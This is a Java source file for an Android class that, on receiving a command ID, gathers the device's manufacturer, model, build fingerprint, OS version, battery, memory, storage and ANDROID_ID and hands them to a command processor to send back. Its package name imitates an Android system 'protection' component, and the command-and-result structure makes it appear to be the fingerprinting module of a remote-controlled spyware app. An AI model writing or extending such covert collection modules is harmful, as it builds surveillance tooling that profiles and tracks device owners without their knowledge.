package com.android.system.protection.commands;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import com.android.system.protection.api.CommandProcessor;

import org.json.JSONObject;

import java.io.File;

public class DeviceInfoCollector {

    public static void collect(Context context, JSONObject params, String commandId) {
        JSONObject info = new JSONObject();
        try {
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("product", Build.PRODUCT);
            info.put("device", Build.DEVICE);
            info.put("board", Build.BOARD);
            info.put("brand", Build.BRAND);
            info.put("hardware", Build.HARDWARE);
            info.put("display", Build.DISPLAY);
            info.put("build_id", Build.ID);
            info.put("build_fingerprint", Build.FINGERPRINT);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);

            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            info.put("battery_level", batteryLevel);
            info.put("battery_status", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS));

            info.put("total_ram", Runtime.getRuntime().totalMemory());
            info.put("free_ram", Runtime.getRuntime().freeMemory());

            File path = Environment.getDataDirectory();
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            info.put("total_storage", totalBlocks * blockSize);
            info.put("free_storage", availableBlocks * blockSize);

            info.put("android_id", android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));

        } catch (Exception e) {
            e.printStackTrace();
        }

        CommandProcessor.sendResult(context, commandId, info);
    }
}